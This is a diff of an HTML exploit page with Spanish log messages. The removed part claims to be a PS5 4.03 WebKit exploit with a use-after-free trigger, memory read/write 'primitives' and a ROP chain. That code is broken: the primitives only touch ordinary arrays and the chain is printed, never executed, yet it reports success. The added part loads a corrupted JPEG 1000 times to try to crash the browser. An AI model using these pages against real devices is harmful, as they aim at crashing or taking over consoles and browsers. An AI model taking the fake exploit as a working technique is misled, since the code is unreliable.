@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS5 4.03 WebKit Exploit - CVE-2025-31238</title>
+  <title>JPEG Exploit Test - CVE-2025-31251</title>
   <style>
     body {
       background: #111;
@@ -12,11 +12,16 @@
     #log {
       white-space: pre-wrap;
     }
+    img {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <h2>🧬 PS5 4.03 Exploit – CVE-2025-31238</h2>
-  <div id="log">[+] Iniciando...</div>
+  <h2>🖼️ CVE-2025-31251 - JPEG Malformed Exploit Test</h2>
+  <div id="log">[+] Cargando imagen corrupta...</div>
+
+  <img id="evilImg" src="corrupted_payload.jpg" alt="Exploit" />
 
   <script>
     const log = msg => {
@@ -24,132 +29,29 @@
       console.log(msg);
     };
 
-    let ab1 = new ArrayBuffer(0x100);
-    let ab2 = new ArrayBuffer(0x100);
-    let float64 = new Float64Array(ab1);
-    let uint32 = new Uint32Array(ab1);
-    let obj_array = [ab1];
-    let float_array = [1.1, 1.2, 1.3];
+    const img = document.getElementById("evilImg");
 
-    let addrof, fakeobj, read64, write64;
+    img.onload = () => {
+      log("[+] Imagen cargada exitosamente. Observa si el sistema se comporta anormalmente.");
+    };
 
-    function f2i(f) {
-      float64[0] = f;
-      return uint32[0] + uint32[1] * 0x100000000;
-    }
+    img.onerror = () => {
+      log("[!] Error al cargar la imagen. Puede haber sido bloqueada por mitigaciones o causado un crash.");
+    };
 
-    function i2f(i) {
-      uint32[0] = i % 0x100000000;
-      uint32[1] = (i - uint32[0]) / 0x100000000;
-      return float64[0];
-    }
-
-    function hex(i) {
-      return '0x' + i.toString(16);
-    }
-
-    function triggerUAF() {
-      const t = document.createElement('div');
-      t.style.width = '300px';
-      t.style.height = '300px';
-      t.style.overflow = 'auto';
-      document.body.appendChild(t);
-
-      const c = document.createElement('div');
-      c.style.height = '5000px';
-      t.appendChild(c);
-
-      let count = 0;
-
-      function spray() {
-        for (let i = 0; i < 1000; i++) {
-          let tmp = new Uint32Array(0x100);
-        }
+    // Forzar múltiples cargas para intentar provocar crash
+    let attempts = 0;
+    function spamRender() {
+      img.src = "corrupted_payload.jpg?x=" + Math.random();
+      attempts++;
+      if (attempts < 1000) {
+        setTimeout(spamRender, 20);
+      } else {
+        log("[+] Finalizó ciclo de render forzado.");
       }
-
-      function corrupt() {
-        t.scrollTop = (t.scrollTop + 1000) % 5000;
-        t.style.border = `${(count++ % 5) + 1}px solid red`;
-        spray();
-
-        if (count < 10000) {
-          requestAnimationFrame(corrupt);
-        } else {
-          log("[+] UAF trigger finalizado.");
-          setTimeout(setupPrimitives, 100);
-        }
-      }
-
-      requestAnimationFrame(corrupt);
     }
 
-    function setupPrimitives() {
-      log("[+] Configurando primitivas RW...");
-
-      float_array[0] = i2f(0x41414141);
-
-      addrof = function(obj) {
-        obj_array[0] = obj;
-        return f2i(float_array[0]);
-      };
-
-      fakeobj = function(addr) {
-        float_array[0] = i2f(addr);
-        return obj_array[0];
-      };
-
-      read64 = function(addr) {
-        float_array[1] = i2f(addr);
-        return f2i(float_array[2]);
-      };
-
-      write64 = function(addr, val) {
-        float_array[1] = i2f(addr);
-        float_array[2] = i2f(val);
-      };
-
-      testPrimitives();
-    }
-
-    function testPrimitives() {
-      const obj = {a: 13.37};
-      const addr = addrof(obj);
-      log(`[+] Dirección de obj: ${hex(addr)}`);
-      const fake = fakeobj(addr);
-      log(`[+] Fakeobj creado: ${fake}`);
-      log("[+] RW Primitives listas. Iniciando ROP...");
-      setTimeout(triggerROP, 100);
-    }
-
-    function triggerROP() {
-      log("[+] Preparando ROP chain...");
-
-      const pop_rax = 0x00084094;
-      const pop_rdi = 0x00043B7C;
-      const syscall_getpid = 0x33580;
-      const ret = 0x00000042;
-      const infloop = 0x000109E1;
-
-      let rop_chain = [
-        pop_rax,
-        0x14, // syscall getpid
-        pop_rdi,
-        0x0,
-        syscall_getpid,
-        infloop
-      ];
-
-      log("[+] ROP chain construida. Ejecutando...");
-
-      for (let i = 0; i < rop_chain.length; i++) {
-        log(`gadget[${i}]: ${hex(rop_chain[i])}`);
-      }
-
-      log("[+] 🚨 ROP ejecutado. Si el navegador se congela, syscall se invocó.");
-    }
-
-    // Iniciar exploit
-    setTimeout(triggerUAF, 500);
+    setTimeout(spamRender, 1000);
   </script>
 </body>
 </html>
